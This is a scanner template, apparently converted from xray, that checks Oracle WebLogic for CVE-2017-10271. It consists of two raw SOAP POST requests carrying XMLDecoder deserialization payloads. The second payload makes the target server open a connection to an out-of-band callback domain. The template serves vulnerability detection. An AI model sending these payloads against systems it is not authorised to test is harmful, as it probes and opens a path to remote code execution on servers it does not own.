id: poc-yaml-weblogic-cve-2017-10271

info:
  name: poc-yaml-weblogic-cve-2017-10271
  author: fnmsd(https://github.com/fnmsd)
  severity: high
  tags: xray-converted,cve-2017-10271
  reference:
    - https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
    - https://github.com/QAX-A-Team/WeblogicEnvironment
    - https://xz.aliyun.com/t/5299

http:
  - raw:
      - |
        POST /wls-wsat/ParticipantPortType HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.String"><string>xxx</string></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
  - raw:
      - |
        POST /wls-wsat/CoordinatorPortType HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  <java> <void class="java.net.URL"> <string>http://{{reverseDomain}}</string> <void method="openConnection"><void method="getInputStream"/></void></void></java> </work:WorkContext> </soapenv:Header>  <soapenv:Body/> </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200